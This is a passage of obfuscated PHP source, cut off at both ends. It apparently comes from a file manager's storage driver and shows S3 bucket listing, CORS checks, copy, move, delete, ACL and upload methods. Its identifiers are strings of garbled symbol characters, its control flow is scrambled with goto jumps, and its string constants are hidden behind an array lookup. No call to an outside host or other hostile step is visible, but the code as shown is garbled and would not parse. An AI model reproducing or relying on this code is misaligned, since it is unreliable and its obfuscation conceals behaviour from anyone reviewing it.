$añêå¶ıÌ  : rtrim($DÇƒ™Ωäåè, $Aˆ¨≠Ûó∑—[8]) . $Aˆ¨≠Ûó∑—[8] . $añêå¶ıÌ ; if ($d¥õ†“¿Ó == REPEAT_REPLACE || !$this->exist($AÏ∫Ÿ∫¯∑Ω) || $bﬁﬂÊÎ‹ßó && $d¥õ†“¿Ó != REPEAT_RENAME_FOLDER) { return $añêå¶ıÌ ; } goto eµú¬é¿óè; FãâÈﬂËÒó: $d’âπß•Ø = 1; $d≈›èÎòÖ¶ = substr($añêå¶ıÌ , 0, strlen($añêå¶ıÌ ) - strlen($aèñ∑ä”ı)); $aËé≥˜êíî = $d≈›èÎòÖ¶ . "\x28{$d’âπß•Ø}\x29{$aèñ∑ä”ı}"; goto Dü•´´ûøı; B≥à†áú∑¯: } private function fileNameAutoList($bê´ƒÏÛ˘…, $cÈæ¿£áÜÇ, $Fƒæßÿ±±Ï = false) { goto Aô·≥ƒ˜©Õ; Aô·≥ƒ˜©Õ: $a‘¯¬˘‹‰µ =& $_SERVER[Öíæ€“”≠éÏË]; $A¡ÙÂÖ∞ïÓ = $this->listPath($bê´ƒÏÛ˘…, !0); $A¡ÙÂÖ∞ïÓ = array_merge($A¡ÙÂÖ∞ïÓ[$a‘¯¬˘‹‰µ[75]], $A¡ÙÂÖ∞ïÓ[$a‘¯¬˘‹‰µ[74]]); goto cÌœëÎàÑ„; eŸ¶€ë∂å“: $Dá≠∂ûÙä› = substr($cÈæ¿£áÜÇ, 0, strlen($cÈæ¿£áÜÇ) - strlen($B¯ÚŒöê¨±)); $e¢ΩõíãÍ® = $Dá≠∂ûÙä› . "\x28\x30\51{$B¯ÚŒöê¨±}"; for ($Bëãîá◊ëñ = 1; $Bëãîá◊ëñ <= count($B∆èúÖ£Çñ) + 1; $Bëãîá◊ëñ++) { $e¢ΩõíãÍ® = $Dá≠∂ûÙä› . "\50{$Bëãîá◊ëñ}\51{$B¯ÚŒöê¨±}"; if (!in_array_not_case($e¢ΩõíãÍ®, $B∆èúÖ£Çñ)) { return $e¢ΩõíãÍ®; } } goto cëüãåÚ√Á; cÌœëÎàÑ„: $B∆èúÖ£Çñ = array_to_keyvalue($A¡ÙÂÖ∞ïÓ, $a‘¯¬˘‹‰µ[33], $a‘¯¬˘‹‰µ[28]); $B¯ÚŒöê¨± = $a‘¯¬˘‹‰µ[95] . get_path_ext($cÈæ¿£áÜÇ); $B¯ÚŒöê¨± = $B¯ÚŒöê¨± == $a‘¯¬˘‹‰µ[95] || $Fƒæßÿ±±Ï ? $a‘¯¬˘‹‰µ[33] : $B¯ÚŒöê¨±; goto eŸ¶€ë∂å“; cëüãåÚ√Á: return $e¢ΩõíãÍ®; goto Bë‹∑’ˆüÊ; Bë‹∑’ˆüÊ: } public function listAllFiles($e¶çü¡æÎê, $F£¿µñª√Û, $BüúøñêÙ£ = array()) { goto CÖ≠ÑÕ¬â™; eç‚¥Ò‡Ãî: foreach (array_unique($cç“˘∂ç—µ) as $c«„∑∫∏÷∫) { $e¯ƒÆ‘—Úà = array($f∑Ü√Ã”ÇÏ[76] => $this->getPathOuter($f∑Ü√Ã”ÇÏ[8] . $e¶çü¡æÎê . $f∑Ü√Ã”ÇÏ[8] . $c«„∑∫∏÷∫), $f∑Ü√Ã”ÇÏ[77] => 1, $f∑Ü√Ã”ÇÏ[78] => 0); if (substr($c«„∑∫∏÷∫, -1) != $f∑Ü√Ã”ÇÏ[8]) { $e¯ƒÆ‘—Úà[$f∑Ü√Ã”ÇÏ[77]] = 0; $Dç∏ÃÂóŸƒ = $this->getPath($e¶çü¡æÎê . $f∑Ü√Ã”ÇÏ[8] . $c«„∑∫∏÷∫); $e¯ƒÆ‘—Úà[$f∑Ü√Ã”ÇÏ[78]] = isset($BüúøñêÙ£[$Dç∏ÃÂóŸƒ]) ? $BüúøñêÙ£[$Dç∏ÃÂóŸƒ] : $this->size($Dç∏ÃÂóŸƒ); } $d≠à«‰ﬁ‘ê[] = $e¯ƒÆ‘—Úà; } return $d≠à«‰ﬁ‘ê; goto C›“ö≈∫≈Ã; CÍƒ“Ê®ÈÇ: $e¶çü¡æÎê = trim($e¶çü¡æÎê, $f∑Ü√Ã”ÇÏ[8]); foreach ($F£¿µñª√Û as $c«„∑∫∏÷∫) { $fÜÎ™ÜªíÈ = ltrim(substr(trim($c«„∑∫∏÷∫, $f∑Ü√Ã”ÇÏ[8]), strlen($e¶çü¡æÎê)), $f∑Ü√Ã”ÇÏ[8]); $cç“˘∂ç—µ = array_merge($cç“˘∂ç—µ, $this->slicePath($fÜÎ™ÜªíÈ)); } $d≠à«‰ﬁ‘ê = array(); goto eç‚¥Ò‡Ãî; CÖ≠ÑÕ¬â™: $f∑Ü√Ã”ÇÏ =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($F£¿µñª√Û)) { return array(); } $cç“˘∂ç—µ = array(); goto CÍƒ“Ê®ÈÇ; C›“ö≈∫≈Ã: } public function slicePath($Dîí§ﬁöÓπ) { $f’Ù®´ôÚô =& $_SERVER[Öíæ€“”≠éÏË]; $bµÖäèêªÓ = explode($f’Ù®´ôÚô[8], trim($Dîí§ﬁöÓπ, $f’Ù®´ôÚô[8])); $e’ØÇÕπ⁄† = 0; do { ++$e’ØÇÕπ⁄†; $DπÏéÉã ≥[] = implode($f’Ù®´ôÚô[8], array_slice($bµÖäèêªÓ, 0, $e’ØÇÕπ⁄†)) . $f’Ù®´ôÚô[8]; } while ($e’ØÇÕπ⁄† < count($bµÖäèêªÓ)); $DπÏéÉã ≥[count($bµÖäèêªÓ) - 1] = $Dîí§ﬁöÓπ; return $DπÏéÉã ≥; } public function getHost() { $E∏äéÇ∏≈ø =& $_SERVER[Öíæ€“”≠éÏË]; $e≤ÿù°¯€” = parse_url(trim($this->domain, $E∏äéÇ∏≈ø[8])); $BÂﬂè”øÉã = isset($e≤ÿù°¯€”[$E∏äéÇ∏≈ø[174]]) ? $e≤ÿù°¯€”[$E∏äéÇ∏≈ø[174]] : http_type(); $C¢ˆá˜πæè = isset($e≤ÿù°¯€”[$E∏äéÇ∏≈ø[175]]) ? $e≤ÿù°¯€”[$E∏äéÇ∏≈ø[175]] : $e≤ÿù°¯€”[$E∏äéÇ∏≈ø[76]]; if (isset($e≤ÿù°¯€”[$E∏äéÇ∏≈ø[176]])) { $C¢ˆá˜πæè .= $E∏äéÇ∏≈ø[4] . $e≤ÿù°¯€”[$E∏äéÇ∏≈ø[176]]; } return $BÂﬂè”øÉã . $E∏äéÇ∏≈ø[177] . $C¢ˆá˜πæè; } public function pathEncode($EöÇ©çΩòÚ) { $Bå©∆È‘–Ë =& $_SERVER[Öíæ€“”≠éÏË]; return str_replace($Bå©∆È‘–Ë[178], $Bå©∆È‘–Ë[8], rawurlencode($EöÇ©çΩòÚ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Fè ˜´Æ©É) { set_timeout(); require_once SDK_DIR . $_SERVER[Öíæ€“”≠éÏË][179]; parent::__construct(); $this->_init($Fè ˜´Æ©É); } public function _init($E±àáÊã∑ø) { foreach ($E±àáÊã∑ø as $a›√ƒ‚¢æë => $eñ√°√â‡Ã) { if (isset($this->{$a›√ƒ‚¢æë})) { $this->{$a›√ƒ‚¢æë} = $eñ√°√â‡Ã; } } $this->endpoint = $E±àáÊã∑ø[$_SERVER[Öíæ€“”≠éÏË][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($e«ÑπìÛê£ = "\x76\x34") { $this->signVer = $e«ÑπìÛê£; $this->client->setSignatureVersion($e«ÑπìÛê£); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto d”ïß”‡÷Õ; Eƒúﬂ¿ıÇß: if ($bﬂﬂëπΩ é[$AÀ™èëÚÆô[181]] != $AÀ™èëÚÆô[182] || $bﬂﬂëπΩ é[$AÀ™èëÚÆô[183]] != $AÀ™èëÚÆô[182]) { return !1; } $bõô◊áÕ™Ò = array_map($AÀ™èëÚÆô[184], $bﬂﬂëπΩ é[$AÀ™èëÚÆô[185]]); if (!is_array($bõô◊áÕ™Ò)) { $bõô◊áÕ™Ò = array(); } goto A∫ûßå‡Ââ; d”ïß”‡÷Õ: $AÀ™èëÚÆô =& $_SERVER[Öíæ€“”≠éÏË]; $bﬂﬂëπΩ é = $this->getBucketCors(); if (!$bﬂﬂëπΩ é || !is_array($bﬂﬂëπΩ é)) { return !1; } goto Eƒúﬂ¿ıÇß; A∫ûßå‡Ââ: $aáñµ·áúß = array($AÀ™èëÚÆô[186], $AÀ™èëÚÆô[187], $AÀ™èëÚÆô[188], $AÀ™èëÚÆô[189], $AÀ™èëÚÆô[190]); $bùáÌ…ëå≈ = array_diff($aáñµ·áúß, $bõô◊áÕ™Ò); return empty($bùáÌ…ëå≈); goto E‚Î¬ÜíöÕ; E‚Î¬ÜíöÕ: } public function mkfile($fä©∑ Óéè, $cÔ≥ñ≥¿«ë = '', $dè§‡Í˘Áﬁ = REPEAT_RENAME) { $fÉﬁ´ÇÁñè = $this->setContent($fä©∑ Óéè, $cÔ≥ñ≥¿«ë); if ($fÉﬁ´ÇÁñè !== !1) { return $this->getPathOuter($fä©∑ Óéè); } return !1; } public function mkdir($F⁄¿≥∏Íßà, $Cﬂ·ª‘íÑ∆ = REPEAT_SKIP) { $EãÇµª‡Âó =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($F⁄¿≥∏Íßà) && $F⁄¿≥∏Íßà !== $EãÇµª‡Âó[191]) { return !1; } if ($this->_isFolder($F⁄¿≥∏Íßà)) { return $this->getPathOuter($F⁄¿≥∏Íßà); } $bÃ¯§´«∑› = $this->setContent($F⁄¿≥∏Íßà, $EãÇµª‡Âó[33], !0); if ($bÃ¯§´«∑› !== !1) { return $this->getPathOuter($F⁄¿≥∏Íßà); } return !1; } public function copyFile($C¥ïÚ©ì¶˘, $AÉÑ †óΩ≠, $fÜ™¨—©…’ = array()) { $CäÛ¢∑ﬂ∫Ì =& $_SERVER[Öíæ€“”≠éÏË]; $b€úµêûóﬂ = $this->objectMeta($C¥ïÚ©ì¶˘); if (!$b€úµêûóﬂ) { return !1; } if ($b€úµêûóﬂ[$CäÛ¢∑ﬂ∫Ì[78]] <= 1024 * 1024 * 200) { $FÁ¿÷∞Ù›ß = $this->client->copyObject($this->bucket, $C¥ïÚ©ì¶˘, $this->bucket, $AÉÑ †óΩ≠, $CäÛ¢∑ﬂ∫Ì[192], $fÜ™¨—©…’); } else { $FÁ¿÷∞Ù›ß = $this->client->multiCopyObject($this->bucket, $C¥ïÚ©ì¶˘, $this->bucket, $AÉÑ †óΩ≠, $fÜ™¨—©…’); } $FÁ¿÷∞Ù›ß = $FÁ¿÷∞Ù›ß ? $this->getPathOuter($AÉÑ †óΩ≠) : !1; return $FÁ¿÷∞Ù›ß; } public function moveFile($D„ÁÂ¿≤ºù, $aóöìò∑®Ô) { if ($this->copyFile($D„ÁÂ¿≤ºù, $aóöìò∑®Ô)) { $this->delFile($D„ÁÂ¿≤ºù); return $this->getPathOuter($aóöìò∑®Ô); } return !1; } public function delFile($E»¨Èüÿ√÷) { return $this->client->deleteObject($this->bucket, $E»¨Èüÿ√÷); } public function delFolder($A˘»ÕØõ›ˆ) { goto aÂûÍ»îüõ; C∑‡≈πÿ®ü: if (!empty($A˘»ÕØõ›ˆ) && $A˘»ÕØõ›ˆ !== $céîåÚÒã≠[191] && !in_array($CÇÜÉÃã†Â, $eÖí·ã¨ôˆ[$céîåÚÒã≠[75]])) { $eÖí·ã¨ôˆ[$céîåÚÒã≠[75]][] = $CÇÜÉÃã†Â; } $B±∞·û££Ë = $this->delByBatch($eÖí·ã¨ôˆ[$céîåÚÒã≠[74]]); if (!$B±∞·û££Ë) { return !1; } goto bæÂ˜úé¶¿; bæÂ˜úé¶¿: $B±∞·û££Ë = $this->delByBatch($eÖí·ã¨ôˆ[$céîåÚÒã≠[75]]); if (!$B±∞·û££Ë) { return !1; } return $this->delFile($CÇÜÉÃã†Â); goto dŸË™ûï≤¬; aÂûÍ»îüõ: $céîåÚÒã≠ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->exist($A˘»ÕØõ›ˆ)) { return !0; } $this->listItemCache = !1; goto bŒÑˆäÕÃ˜; bŒÑˆäÕÃ˜: $eÖí·ã¨ôˆ = $this->fileList($A˘»ÕØõ›ˆ); $this->listItemCache = !0; $CÇÜÉÃã†Â = trim($A˘»ÕØõ›ˆ, $céîåÚÒã≠[8]) . $céîåÚÒã≠[8]; goto C∑‡≈πÿ®ü; dŸË™ûï≤¬: } private function delByBatch($b∂Ó·„–ÎÉ) { foreach (array_chunk($b∂Ó·„–ÎÉ, 1000) as $Cµ—ù∂“´¶) { $d§Áç·µ¡∂ = $this->client->deleteObjects($this->bucket, $Cµ—ù∂“´¶); if (!$d§Áç·µ¡∂) { return !1; } } return !0; } public function rename($fÂ®¯Ùå∑û, $DÇî˘µºß≠) { return $this->renameObject($fÂ®¯Ùå∑û, $DÇî˘µºß≠); } public function listPath($c‹ ûîﬁÓ§, $eíÑÕö´§€ = false) { $c≠ﬁÑ€÷ÊŸ =& $_SERVER[Öíæ€“”≠éÏË]; $eÓÍ∏ôØß§ = $this->fileList($c‹ ûîﬁÓ§, $c≠ﬁÑ€÷ÊŸ[8], !0); foreach ($eÓÍ∏ôØß§[$c≠ﬁÑ€÷ÊŸ[75]] as $a—ç⁄õÌæ¶ => $f⁄∫â∫¯∫Ù) { $eÓÍ∏ôØß§[$c≠ﬁÑ€÷ÊŸ[75]][$a—ç⁄õÌæ¶] = $this->folderInfo($f⁄∫â∫¯∫Ù, $eíÑÕö´§€); } foreach ($eÓÍ∏ôØß§[$c≠ﬁÑ€÷ÊŸ[74]] as $a—ç⁄õÌæ¶ => $f⁄∫â∫¯∫Ù) { $eÓÍ∏ôØß§[$c≠ﬁÑ€÷ÊŸ[74]][$a—ç⁄õÌæ¶] = $this->fileInfo($f⁄∫â∫¯∫Ù[$c≠ﬁÑ€÷ÊŸ[28]], $eíÑÕö´§€, $f⁄∫â∫¯∫Ù); } return $eÓÍ∏ôØß§; } private function fileInfo($FÕﬂﬂ‰îÉ¶, $C‘º°„¿µ  = false, $Eò¥ÖÖÑ∞⁄ = array()) { goto eÖ‚á“ ıé; cãê©Ââô™: if (isset($Eò¥ÖÖÑ∞⁄[$Dó§ÇÆñ°≈[197]])) { $EÿøüÜ†Öƒ[$Dó§ÇÆñ°≈[84]] = $Eò¥ÖÖÑ∞⁄[$Dó§ÇÆñ°≈[197]]; } if (isset($Eò¥ÖÖÑ∞⁄[$Dó§ÇÆñ°≈[78]])) { $EÿøüÜ†Öƒ[$Dó§ÇÆñ°≈[78]] = $Eò¥ÖÖÑ∞⁄[$Dó§ÇÆñ°≈[78]]; } return $EÿøüÜ†Öƒ; goto F·®ÖäÕûî; eÖ‚á“ ıé: $Dó§ÇÆñ°≈ =& $_SERVER[Öíæ€“”≠éÏË]; $EÿøüÜ†Öƒ = array($Dó§ÇÆñ°≈[28] => $this->pathThis($FÕﬂﬂ‰îÉ¶), $Dó§ÇÆñ°≈[76] => $this->getPathOuter($FÕﬂﬂ‰îÉ¶), $Dó§ÇÆñ°≈[29] => $Dó§ÇÆñ°≈[193], $Dó§ÇÆñ°≈[168] => $this->ext($FÕﬂﬂ‰îÉ¶), $Dó§ÇÆñ°≈[78] => isset($Eò¥ÖÖÑ∞⁄[$Dó§ÇÆñ°≈[78]]) ? $Eò¥ÖÖÑ∞⁄[$Dó§ÇÆñ°≈[78]] : 0); if ($C‘º°„¿µ ) { return $EÿøüÜ†Öƒ; } goto DÉõﬁùÒÖ‚; DÉõﬁùÒÖ‚: $EÿøüÜ†Öƒ[$Dó§ÇÆñ°≈[194]] = $EÿøüÜ†Öƒ[$Dó§ÇÆñ°≈[84]] = 0; $EÿøüÜ†Öƒ[$Dó§ÇÆñ°≈[195]] = $EÿøüÜ†Öƒ[$Dó§ÇÆñ°≈[196]] = !0; if (empty($Eò¥ÖÖÑ∞⁄)) { $Eò¥ÖÖÑ∞⁄ = $this->objectMeta($FÕﬂﬂ‰îÉ¶); if (!$Eò¥ÖÖÑ∞⁄) { return $EÿøüÜ†Öƒ; } } goto cãê©Ââô™; F·®ÖäÕûî: } private function folderInfo($fﬂ‚ÏãÕ’Ã, $eÉ˜Æ€«òˆ = false) { goto Cñ¥Ëπöã”; Cñ¥Ëπöã”: $c¥∫åõÖÁë =& $_SERVER[Öíæ€“”≠éÏË]; $eøÃ∏‚≥ª≤ = array($c¥∫åõÖÁë[28] => $this->pathThis($fﬂ‚ÏãÕ’Ã), $c¥∫åõÖÁë[76] => $this->getPathOuter($c¥∫åõÖÁë[8] . $fﬂ‚ÏãÕ’Ã), $c¥∫åõÖÁë[29] => $c¥∫åõÖÁë[77]); if ($eÉ˜Æ€«òˆ) { return $eøÃ∏‚≥ª≤; } goto Dµ”πƒª¿≤; Dµ”πƒª¿≤: $eøÃ∏‚≥ª≤[$c¥∫åõÖÁë[194]] = $eøÃ∏‚≥ª≤[$c¥∫åõÖÁë[84]] = 0; $eøÃ∏‚≥ª≤[$c¥∫åõÖÁë[195]] = $eøÃ∏‚≥ª≤[$c¥∫åõÖÁë[196]] = !0; if ($fﬂ‚ÏãÕ’Ã == $c¥∫åõÖÁë[33]) { return $eøÃ∏‚≥ª≤; } goto bùÀë⁄öõ›; Dí·Œ≠êõ—: return $eøÃ∏‚≥ª≤; goto Cä⁄Ñ∂ÿÉÔ; bùÀë⁄öõ›: $fﬂ‚ÏãÕ’Ã = trim($fﬂ‚ÏãÕ’Ã, $c¥∫åõÖÁë[8]) . $c¥∫åõÖÁë[8]; $Fá©∞∞Ωˆø = $this->objectMeta($fﬂ‚ÏãÕ’Ã); if (isset($Fá©∞∞Ωˆø[$c¥∫åõÖÁë[197]])) { $eøÃ∏‚≥ª≤[$c¥∫åõÖÁë[194]] = $Fá©∞∞Ωˆø[$c¥∫åõÖÁë[197]]; } goto Dí·Œ≠êõ—; Cä⁄Ñ∂ÿÉÔ: } private function fileList($Eª‡∂±ßêú, $E¬˘éíÒåƒ = '', $BÙáΩÎßóã = 0) { goto eÖ—˜¨ Úà; eÖ—˜¨ Úà: $B≤ÉôËßø  =& $_SERVER[Öíæ€“”≠éÏË]; $EüŒ¶£ãÛÁ = rtrim($Eª‡∂±ßêú, $B≤ÉôËßø [8]) . $B≤ÉôËßø [8]; $eŒÖ‹÷Ú”ÿ = $this->listObjs($EüŒ¶£ãÛÁ, null, null, $E¬˘éíÒåƒ); goto eéáêü‡ÒÈ; FÁãÇ√ƒŸÉ: foreach ($eŒÖ‹÷Ú”ÿ[$B≤ÉôËßø [198]] as $FÎÉÛÍ ÿ…) { goto dí÷ñäË÷Ù; DÜÿñüùªå: $F⁄Ó≤πàÏé = $BŒÓ˘‚˘ûƒ == 0 && substr($Cíœµ–áû∏, strlen($Cíœµ–áû∏) - 1, 1) == $B≤ÉôËßø [8] ? !0 : !1; if ($C‚ûıúÚ±¿) { $this->cacheMethod($B≤ÉôËßø [199], $Cíœµ–áû∏, $F⁄Ó≤πàÏé); $this->cacheMethod($B≤ÉôËßø [200], $Cíœµ–áû∏, $FÎÉÛÍ ÿ…); } if ($F⁄Ó≤πàÏé) { $d†óÈòø¶Ç[] = $Cíœµ–áû∏; continue; } goto CâÃﬁê Áƒ; CâÃﬁê Áƒ: $Aã˜»ïﬂüû[] = $BÙáΩÎßóã ? $FÎÉÛÍ ÿ… : $Cíœµ–áû∏; goto f⁄Éﬁ∏ç¢¨; dí÷ñäË÷Ù: $Cíœµ–áû∏ = $FÎÉÛÍ ÿ…[$B≤ÉôËßø [28]]; if ($Cíœµ–áû∏ == $EüŒ¶£ãÛÁ) { continue; } $BŒÓ˘‚˘ûƒ = isset($FÎÉÛÍ ÿ…[$B≤ÉôËßø [78]]) ? $FÎÉÛÍ ÿ…[$B≤ÉôËßø [78]] : 0; goto DÜÿñüùªå; f⁄Éﬁ∏ç¢¨: } foreach ($eŒÖ‹÷Ú”ÿ[$B≤ÉôËßø [201]] as $FÎÉÛÍ ÿ…) { $d†óÈòø¶Ç[] = $FÎÉÛÍ ÿ…[$B≤ÉôËßø [28]]; if ($C‚ûıúÚ±¿) { $this->cacheMethod($B≤ÉôËßø [199], $FÎÉÛÍ ÿ…[$B≤ÉôËßø [28]], !0); } } if ($C‚ûıúÚ±¿) { $this->cacheMethod($B≤ÉôËßø [199], $Eª‡∂±ßêú, !0); } goto cõ≥Ñ£µÉŸ; eéáêü‡ÒÈ: if (!$eŒÖ‹÷Ú”ÿ) { return array($B≤ÉôËßø [75] => array(), $B≤ÉôËßø [74] => array()); } $C‚ûıúÚ±¿ = $this->listItemCache === !1 ? !1 : !0; $d†óÈòø¶Ç = $Aã˜»ïﬂüû = array(); goto FÁãÇ√ƒŸÉ; cõ≥Ñ£µÉŸ: return array($B≤ÉôËßø [75] => $d†óÈòø¶Ç, $B≤ÉôËßø [74] => $Aã˜»ïﬂüû); goto bÀÖäÉ°ÃÛ; bÀÖäÉ°ÃÛ: } private function listObjs($dÀÆÿÀŒ…Ü, $fÉ‹Î¥§∂û = null, $fëçΩü¡≥± = null, $dì†û™‹ÙÎ = null) { $FŸ¥∑û∫ã˜ =& $_SERVER[Öíæ€“”≠éÏË]; $dÀÆÿÀŒ…Ü = trim($dÀÆÿÀŒ…Ü, $FŸ¥∑û∫ã˜[8]); $f£¡∂Ì∂ß≥ = empty($dÀÆÿÀŒ…Ü) && $dÀÆÿÀŒ…Ü !== $FŸ¥∑û∫ã˜[191] ? $FŸ¥∑û∫ã˜[33] : $dÀÆÿÀŒ…Ü . $FŸ¥∑û∫ã˜[8]; return $this->client->getBucket($this->bucket, $f£¡∂Ì∂ß≥, $fÉ‹Î¥§∂û, $fëçΩü¡≥±, $dì†û™‹ÙÎ, !0); } public function has($EÉ»¨•»ö£, $a⁄ÛÒ¥õºö = false, $C€ﬂåÂ“≠€ = true) { goto d„æ˜á∫‘ã; E…øŒÁº‹´: $eàÖ´Ñ≤ËÚ = null; $a¯ãéî©Ü÷ = 500; $D∂Ωé≥Á°î = $F”ˆÎ∂„ç[8]; goto Dæ»Üˆë∆ø; d„æ˜á∫‘ã: $F”ˆÎ∂„ç =& $_SERVER[Öíæ€“”≠éÏË]; $EÉ»¨•»ö£ = trim($EÉ»¨•»ö£, $F”ˆÎ∂„ç[8]); $a¡—ì€¯ﬂ¨ = empty($EÉ»¨•»ö£) && $EÉ»¨•»ö£ !== $F”ˆÎ∂„ç[191] ? $F”ˆÎ∂„ç[33] : $EÉ»¨•»ö£ . $F”ˆÎ∂„ç[8]; goto E…øŒÁº‹´; c¶œ◊ºﬂ‘Ì: return !1; goto eÑåıû»»Ç; Dæ»Üˆë∆ø: $Dã⁄…≤Ô∂É = $F·Çàõê»© = array(); while (!0) { $a‡ËΩ∫ÿ…ï = $this->listObjs($EÉ»¨•»ö£, $eàÖ´Ñ≤ËÚ, $a¯ãéî©Ü÷, $D∂Ωé≥Á°î); if (!$a‡ËΩ∫ÿ…ï) { break; } $eàÖ´Ñ≤ËÚ = $a‡ËΩ∫ÿ…ï[$F”ˆÎ∂„ç[202]]; $eñƒ¯•ˆäÊ = $a‡ËΩ∫ÿ…ï[$F”ˆÎ∂„ç[198]]; $E≤›æë…Í– = $a‡ËΩ∫ÿ…ï[$F”ˆÎ∂„ç[201]]; if (empty($eñƒ¯•ˆäÊ) && empty($E≤›æë…Í–)) { break; } if (count($eñƒ¯•ˆäÊ) == 1 && $eñƒ¯•ˆäÊ[0][$F”ˆÎ∂„ç[28]] == $a¡—ì€¯ﬂ¨) { break; } if ($a⁄ÛÒ¥õºö) { if (count($eñƒ¯•ˆäÊ)) { $eñƒ¯•ˆäÊ = array_column($eñƒ¯•ˆäÊ, $F”ˆÎ∂„ç[28]); $Dã⁄…≤Ô∂É = array_merge($Dã⁄…≤Ô∂É, $eñƒ¯•ˆäÊ); } if (count($E≤›æë…Í–)) { $E≤›æë…Í– = array_column($E≤›æë…Í–, $F”ˆÎ∂„ç[28]); $F·Çàõê»© = array_merge($F·Çàõê»©, $E≤›æë…Í–); } if ($eàÖ´Ñ≤ËÚ === null) { break; } continue; } if ($C€ﬂåÂ“≠€) { if (!empty($eñƒ¯•ˆäÊ)) { if (count($eñƒ¯•ˆäÊ) > 1 || isset($eñƒ¯•ˆäÊ[0][$F”ˆÎ∂„ç[28]]) && $eñƒ¯•ˆäÊ[0][$F”ˆÎ∂„ç[28]] != $a¡—ì€¯ﬂ¨) { return !0; } } } else { if (!empty($E≤›æë…Í–)) { return !0; } } if ($eàÖ´Ñ≤ËÚ === null) { break; } } if ($a⁄ÛÒ¥õºö) { $Dã⁄…≤Ô∂É = array_diff($Dã⁄…≤Ô∂É, array($a¡—ì€¯ﬂ¨)); $Dã⁄…≤Ô∂É = count(array_unique($Dã⁄…≤Ô∂É)); $F·Çàõê»© = count(array_unique($F·Çàõê»©)); return array($F”ˆÎ∂„ç[203] => $Dã⁄…≤Ô∂É, $F”ˆÎ∂„ç[204] => $F·Çàõê»©); } goto c¶œ◊ºﬂ‘Ì; eÑåıû»»Ç: } public function listAll($cÿ≈àÉ≈á‡) { $aÔπΩØı—Û =& $_SERVER[Öíæ€“”≠éÏË]; $aÂ©úÀÆπ∂ = $this->fileList($cÿ≈àÉ≈á‡, $aÔπΩØı—Û[33], !0); $D∫øŸüıàì = array(); foreach ($aÂ©úÀÆπ∂[$aÔπΩØı—Û[74]] as $aÙÖÈ•‡ô°) { $D∫øŸüıàì[$aÙÖÈ•‡ô°[$aÔπΩØı—Û[28]]] = $aÙÖÈ•‡ô°[$aÔπΩØı—Û[78]]; } foreach ($aÂ©úÀÆπ∂[$aÔπΩØı—Û[75]] as $aÙÖÈ•‡ô°) { if (is_string($aÙÖÈ•‡ô°)) { $D∫øŸüıàì[$aÙÖÈ•‡ô°] = 0; } } return $this->listAllFiles($cÿ≈àÉ≈á‡, array_keys($D∫øŸüıàì), $D∫øŸüıàì); } public function canRead($BÃ£äË“ËÜ) { $c°£«⁄≈¡ç =& $_SERVER[Öíæ€“”≠éÏË]; $fªˆ⁄øÉ±» = $this->client->getAccessControlPolicy($this->bucket, $BÃ£äË“ËÜ); if (!$fªˆ⁄øÉ±») { return !1; } return in_array($fªˆ⁄øÉ±», array($c°£«⁄≈¡ç[205], $c°£«⁄≈¡ç[206], $c°£«⁄≈¡ç[207])) ? !0 : !1; } public function canWrite($d‰ıàèíÊŸ) { $Fó©ôçÍ’ë =& $_SERVER[Öíæ€“”≠éÏË]; $fºãöÊÈíª = $this->client->getAccessControlPolicy($this->bucket, $d‰ıàèíÊŸ); if (!$fºãöÊÈíª) { return !1; } return in_array($fºãöÊÈíª, array($Fó©ôçÍ’ë[205], $Fó©ôçÍ’ë[206])) ? !0 : !1; } public function getContent($eô•Ôÿ»çΩ) { return $this->client->getObject($this->bucket, $eô•Ôÿ»çΩ); } public function setContent($b∆“ÀÂÇΩÊ, $Eûé∂¯ÓÎ† = '', $EÙ°¿…£Ê© = false) { goto c± “’‹î¨; E¥˜‹ŸôÖÈ: $b–âÑéº£í = $this->client->putObject($Eûé∂¯ÓÎ†, $this->bucket, $b∆“ÀÂÇΩÊ, $CÖÕéÎ…çı[192], array(), $DíÎàß‰è‘); if (!$b–âÑéº£í) { return !1; } if ($EÙ°¿…£Ê©) { return !0; } goto Bõæå‹µ»Ê; Bõæå‹µ»Ê: $this->cacheMethod(null, null); $b–âÑéº£í = $this->copyFile($b∆“ÀÂÇΩÊ, $b∆“ÀÂÇΩÊ, array($CÖÕéÎ…çı[208] => $b–âÑéº£í[$CÖÕéÎ…çı[209]])); return $b–âÑéº£í ? !0 : !1; goto BªÜòàøœ¿; c± “’‹î¨: $CÖÕéÎ…çı =& $_SERVER[Öíæ€“”≠éÏË]; $b∆“ÀÂÇΩÊ = $EÙ°¿…£Ê© ? trim($b∆“ÀÂÇΩÊ, $CÖÕéÎ…çı[8]) . $CÖÕéÎ…çı[8] : $b∆“ÀÂÇΩÊ; $DíÎàß‰è‘ = get_file_mime(get_path_ext($b∆“ÀÂÇΩÊ)); goto E¥˜‹ŸôÖÈ; BªÜòàøœ¿: } public function fileSubstr($bÍ¡”õ–®∏, $C¿¡è¯€√í, $f…•‡€ﬂˆß) { $dØÖì”™µå = $C¿¡è¯€√í + $f…•‡€ﬂˆß - 1; return $this->client->getObject($this->bucket, $bÍ¡”õ–®∏, array($_SERVER[Öíæ€“”≠éÏË][210] => "\142\171\x74\x65\163\x3d{$C¿¡è¯€√í}\x2d{$dØÖì”™µå}")); } public function upload($e©ò‚±Íùá, $AÃÂÏ’ûªÇ, $C·†∏ÓÙëæ = false, $cøï÷ä†ãå = REPEAT_REPLACE) { $Eêƒãˆãæé =& $_SERVER[Öíæ€“”≠éÏË]; $BÙ•›ı∏ÉÃ = array($Eêƒãˆãæé[208] => @md5_file($AÃÂÏ’ûªÇ)); $cø≠“ÛüÈ◊ = array($Eêƒãˆãæé[211] => get_file_mime(get_path_ext($e©ò‚±Íùá))); if (IO::size($AÃÂÏ’ûªÇ) <= 1024 * 1024 * 200) { $Fﬂ—ŒñÃà¿ = $this->client->putObjectFile($AÃÂÏ’ûªÇ, $this->bucket, $e©ò‚±Íùá, $Eêƒãˆãæé[192], $BÙ•›ı∏ÉÃ, 